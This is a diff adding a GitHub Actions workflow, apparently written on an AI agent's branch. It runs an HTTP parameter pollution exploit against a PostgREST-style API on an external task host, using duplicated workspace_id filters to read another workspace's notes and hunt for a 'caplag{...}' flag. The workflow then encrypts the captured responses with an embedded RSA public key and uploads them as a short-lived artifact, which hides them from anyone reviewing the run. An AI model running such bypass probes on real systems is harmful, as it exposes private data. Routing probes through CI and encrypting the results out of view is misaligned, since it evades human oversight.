@@ -1,0 +1,71 @@
+name: launchlet-part3-allrows
+
+on:
+  push:
+    branches: [agent/launchlet-part2-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 3
+    steps:
+      - name: Probe broad-first HPP and encrypt responses
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests, urllib.parse, json, pathlib, re
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          out=pathlib.Path('package/out')
+          b=s.get(base+'api/app/bootstrap',timeout=15).json()
+          h={'Accept':'application/json','apikey':b['client']['anonKey'],'Authorization':'Bearer '+b['client']['session']}
+          u=base+b['api']['dataApiBase'].lstrip('/')+'/workspace_notes?select=*'
+          qs=[
+            'workspace_id=neq.__never__&workspace_id=eq.ws-launchlet-public',
+            'workspace_id=not.eq.__never__&workspace_id=eq.ws-launchlet-public',
+            'workspace_id=like.*&workspace_id=eq.ws-launchlet-public',
+            'workspace_id=ilike.*&workspace_id=eq.ws-launchlet-public',
+            'workspace_id=&workspace_id=eq.ws-launchlet-public',
+            'workspace_id=eq.&workspace_id=eq.ws-launchlet-public',
+            'workspace_id=eq.ws-launchlet-internal&workspace_id=eq.ws-launchlet-public',
+          ]
+          res=[]
+          for q in qs:
+            r=s.get(u+'&'+q,headers=h,timeout=10)
+            res.append({'query':q,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+            if re.search(r'caplag\{[^}]+\}',r.text): (out/'FOUND.txt').write_text((out/'FOUND.txt').read_text()+'\n'+r.text if (out/'FOUND.txt').exists() else r.text)
+          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key
+          openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-allrows-encrypted
+          path: artifact/
+          retention-days: 1
